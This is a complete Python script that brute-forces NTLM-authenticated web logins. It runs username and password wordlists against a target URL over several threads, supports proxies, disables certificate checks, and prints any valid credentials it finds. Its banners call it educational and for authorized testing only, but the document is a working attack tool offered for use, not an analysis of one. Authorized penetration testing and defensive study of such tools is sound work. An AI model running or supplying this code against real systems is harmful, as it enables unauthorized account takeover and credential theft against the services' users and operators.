import requests
from requests_ntlm import HttpNtlmAuth
import time
import argparse
import threading
from queue import Queue

class NTLMBruteForcer:
    def __init__(self, target_url, userfile, passfile, delay=0, max_threads=5, proxy=None):
        self.target_url = target_url
        self.userfile = userfile
        self.passfile = passfile
        self.delay = delay
        self.max_threads = max_threads
        self.proxy = proxy
        self.found_creds = []
        self.queue = Queue()
        self.lock = threading.Lock()

    def load_credentials(self):
        try:
            with open(self.userfile, 'r') as f:
                users = [line.strip() for line in f.readlines()]
            
            with open(self.passfile, 'r') as f:
                passwords = [line.strip() for line in f.readlines()]
            
            for user in users:
                for password in passwords:
                    self.queue.put((user, password))
            
            return True
        except Exception as e:
            print(f"[!] Error loading files: {e}")
            return False

    def worker(self):
        while not self.queue.empty():
            user, password = self.queue.get()
            try:
                # Prepare request parameters
                request_params = {
                    'auth': HttpNtlmAuth(user, password),
                    'timeout': 10,
                    'verify': False  # For lab use only, do not use in production
                }
                
                # Add proxy if specified
                if self.proxy:
                    request_params['proxies'] = {
                        'http': self.proxy,
                        'https': self.proxy
                    }
                
                response = requests.get(self.target_url, **request_params)
                
                if response.status_code == 200:
                    with self.lock:
                        self.found_creds.append((user, password))
                        print(f"\n[+] SUCCESS! {user}:{password}")
                else:
                    print(f"[-] Failed: {user}:{password} | Status: {response.status_code}")
                
                time.sleep(self.delay)
            except requests.exceptions.RequestException as e:
                print(f"[!] Error with {user}:{password} - {str(e)}")
            finally:
                self.queue.task_done()

    def start(self):
        if not self.load_credentials():
            return
        
        print(f"\n[•] Starting NTLM brute force on: {self.target_url}")
        print(f"[•] Loaded {self.queue.qsize()} credential combinations")
        print(f"[•] Using {self.max_threads} threads with delay={self.delay}s")
        if self.proxy:
            print(f"[•] Using proxy: {self.proxy}")
        print()
        
        for _ in range(self.max_threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
        
        self.queue.join()
        
        if self.found_creds:
            print("\n[!] Discovered valid credentials:")
            for user, password in self.found_creds:
                print(f"  → {user}:{password}")
        else:
            print("\n[!] No valid credentials found")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='NTLM Brute Force Simulator (Educational Use Only)')
    parser.add_argument('-u', '--userfile', required=True, help='File containing usernames')
    parser.add_argument('-p', '--passfile', required=True, help='File containing passwords')
    parser.add_argument('-url', '--target', required=True, help='Target URL (e.g., http://sharepoint.lab)')
    parser.add_argument('-d', '--delay', type=float, default=0, help='Delay between attempts (seconds)')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of concurrent threads')
    parser.add_argument('-x', '--proxy', help='Proxy server (e.g., http://proxy:8080 or socks5://proxy:1080)')
    
    args = parser.parse_args()
    
    print("\n[!] WARNING: This tool is for educational and authorized testing only!")
    print("[!] Never use this tool on systems without explicit permission\n")
    
    bruteforcer = NTLMBruteForcer(
        target_url=args.target,
        userfile=args.userfile,
        passfile=args.passfile,
        delay=args.delay,
        max_threads=args.threads,
        proxy=args.proxy
    )
    
    bruteforcer.start()
